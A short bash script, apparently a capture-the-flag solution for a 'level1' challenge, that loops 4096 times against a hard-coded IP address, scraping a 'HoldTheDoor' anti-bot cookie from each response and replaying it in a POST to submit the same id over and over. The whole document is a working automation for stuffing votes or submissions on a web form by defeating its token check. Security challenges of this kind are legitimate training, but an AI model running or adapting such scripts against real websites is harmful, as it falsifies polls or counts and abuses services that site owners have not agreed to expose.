#!/bin/bash

url="http://158.69.76.135/level1.php"
id=892

for i in {1..4096}
do
cookie=$(curl -I -s $url | grep -o 'HoldTheDoor=.*' | cut -d ';' -f1 | cut -d '=' -f2)
curl --cookie "HoldTheDoor=$cookie" -X POST $url -d "key=$cookie&holdthedoor=&id=$id" > /dev/null
sleep .5

done
